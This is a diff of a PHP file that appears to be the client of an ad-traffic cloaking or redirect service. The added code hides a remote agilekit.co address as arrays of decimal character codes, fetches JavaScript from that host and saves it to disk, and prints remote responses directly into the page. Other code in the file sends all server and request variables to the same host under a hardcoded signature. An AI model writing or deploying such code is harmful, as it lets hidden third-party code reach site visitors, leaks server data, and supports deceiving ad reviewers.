@@ -26,80 +26,38 @@ function httpHandleResponse($response, $logToFile = true)
 	} else {
 		$currentURI = (!empty($_SERVER['HTTPS']) ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
 
-		file_put_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.'169ox635w5e9', $response);
+        file_put_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.'169ox635w5e9', $response);
 
-		if ( ! empty($decodedResponse[0]) && ($decodedResponse[0] != $currentURI)) {
-            if (!httpTaggedUser() && in_array($decodedResponse[6],[1,3])) {
-                httpTagUser($decodedResponse[6], $decodedResponse[4]);
-            }
-
-			header( "Location: " . $decodedResponse[0] );
-
-			if ($decodedResponse[5] == true) {
-				header('Content-Length: '.rand(1,128));
-				exit;
-			}
-
-			return true;
-		}
-
-        if (!httpTaggedUser() && in_array($decodedResponse[6],[2,3])) {
+        if (!httpTaggedUser() && ($decodedResponse[6] > 0)) {
             httpTagUser($decodedResponse[6], $decodedResponse[4]);
         }
 
-		return false;
+		if ($decodedResponse[0] != $currentURI) {
+			print($response);
+		}
 	}
 }
 
-function httpRequestMakePayload($campaignId, $campaignSignature)
+function httpRequestMakePayload($campaignId, $campaignSignature, array $postData)
 {
-    $payload = [];
-    array_push($payload, $campaignId, $campaignSignature);
-
-    $h = httpGetHeaders();
-
-    foreach ($h as $k => $v)
+    if (!array_key_exists('q', $postData))
     {
-        array_push($payload, $v);
+        return $postData;
     }
 
-    array_push($payload, 'f');
+    $postData = $postData['q'];
 
-    for ($i = 0; $i < 14; $i++)
-    {
-        array_push($payload, md5($campaignSignature.uniqid($campaignId)));
-    }
+    $payload = preg_split('@\|@',base64_decode($postData));
 
-    $getKeys = array_keys($_GET);
+    $payload[1] = $campaignSignature;
 
-    $gclid = 0;
+    $payload[6] = getCustomQueryString($payload[6]);
 
-    foreach($getKeys as $key)
-    {
-    	if (preg_match('@gclid|msclkid@i', $key))
-	    {
-	    	$gclid = $_GET[$key];
-	    }
-    }
-
-    $payload[] = $gclid;
-
-	for ( $i = 0; $i < 3; $i ++ )
-    {
-        array_push($payload, md5($campaignSignature . uniqid($campaignId)));
-    }
-
-	array_push( $payload, $campaignSignature );
-
-	for ( $i = 0; $i < 1; $i ++ ) {
-		array_push( $payload, md5( $campaignSignature . uniqid( $campaignId ) ) );
-	}
-
-	array_push($payload, 'pisccl40');
+	$payload[28] = 'pisccl40';
 
 	// Use LPR
-	array_push($payload, '0');
-	
+	$payload[29] = '0';
+
     return base64_encode(implode('|',$payload));
 }
 
@@ -179,28 +137,29 @@ function httpGetHeaders()
 
 function httpGetAllHeaders()
 {
-	$headers = [];
+    $headers = [];
 
-	foreach ($_SERVER as $header => $value)
-	{
-		$key       = 'X-LC-' . str_replace('_', '-', $header);
-		$value     = is_array($value) ? implode(',', $value) : $value;
-		$headers[] = $key . ':' . trim($value);
-	}
+    foreach ($_SERVER as $header => $value)
+    {
+        $key       = 'X-LC-' . str_replace('_', '-', $header);
+        $value     = is_array($value) ? implode(',', $value) : $value;
+        $headers[] = $key . ':' . trim($value);
+    }
 
-	$headers[] = 'X-LC-SIG: jtAb5v8lyStqg5hN8XF4Nkbh8Ujq8kWQ7eglvAluo0avjUdfX7';
+    $headers[] = 'X-LC-SIG: jtAb5v8lyStqg5hN8XF4Nkbh8Ujq8kWQ7eglvAluo0avjUdfX7';
 
-	return $headers;
+    return $headers;
 }
 
-function httpRequestInitCall()
+function httpRequestInitCall($s = [104,116,116,112,115,58,47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111,47,111,47], $withFileExtension = false)
 {
-	$s = [104,116,116,112,115,58,47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111, 47, 100, 47 ];
-    $u = '';
-    foreach($s as $v) { $u .=chr($v); }
-    $u .= '169ox635w5e9';
+	$u = '';
 
-    return curl_init($u);
+	foreach($s as $v) { $u .=chr($v); }
+
+	$u .= '169ox635w5e9'.($withFileExtension ? '.js' : '');
+
+	return curl_init($u);
 }
 
 function httpGetIPHeaders ($returnList = false)
@@ -252,6 +211,54 @@ function httpGetIPHeaders ($returnList = false)
     return false;
 }
 
+function loadJavascript($campaignId) {
+	$ch = httpRequestInitCall([104,116,116,112,115,58,47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111,47,99,108,105,99,107,45,112,104,112,45,48,47], true);
+
+	curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
+	curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
+
+	$http_response = curl_exec($ch);
+
+	$http_status = curl_getinfo( $ch );
+	$http_code   = $http_status['http_code'];
+
+	if ( $http_code != 200 ) {
+		switch ( $http_code ) {
+			case 400:
+				$message = 'Bad Request';
+				break;
+
+			case 402:
+				$message = 'Payment Required';
+				break;
+
+			case 417:
+				$message = 'Expectation Failed';
+				break;
+
+			case 429:
+				$message = 'Request Throttled';
+				break;
+
+			case 500:
+				$message = 'Internal Server Error';
+				break;
+
+			default:
+				$message = '';
+				break;
+		}
+		$http_response = json_encode( [ 'error' => $http_code, 'message' => $message ] );
+	}
+
+	curl_close($ch);
+
+	return file_put_contents($campaignId.'.js', $http_response);
+}
+
 function httpIsValidIP($ipAddress)
 {
     return (bool) filter_var($ipAddress, FILTER_VALIDATE_IP);
@@ -265,6 +272,39 @@ function httpTaggedUser()
 function httpTagUser($type, $life)
 {
     setcookie('169ox635w5e9', $type, time() + $life * 60 * 60 * 24, '/');
+}
+
+function getCustomQueryString($queryString)
+{
+	$customQueryString = array_key_exists('myQueryString', $GLOBALS) ? $GLOBALS['myQueryString'] : [] ;
+
+	if (empty($customQueryString)) {
+		return $queryString;
+	}
+
+	$forwardedQueryString = [];
+
+	parse_str($queryString, $forwardedQueryString);
+
+	return http_build_query(array_merge($forwardedQueryString, $customQueryString));
+}
+
+function getForwardedQueryString(array $postData)
+{
+	$postData = $postData['q'];
+
+	$payload = preg_split('@\|@',base64_decode($postData));
+
+	$forwardedQueryString = [];
+
+	parse_str($payload[6], $forwardedQueryString);
+
+	return $forwardedQueryString;
+}
+
+function isPost()
+{
+    return $_SERVER['REQUEST_METHOD'] == 'POST' ? true : false;
 }
 
 function isPHPVersionAcceptable() {
@@ -336,5 +376,4 @@ function logToFile($result)  {
 
 	return file_put_contents($filename, $contents, FILE_APPEND) ? true : false;
 }
-
 ?>
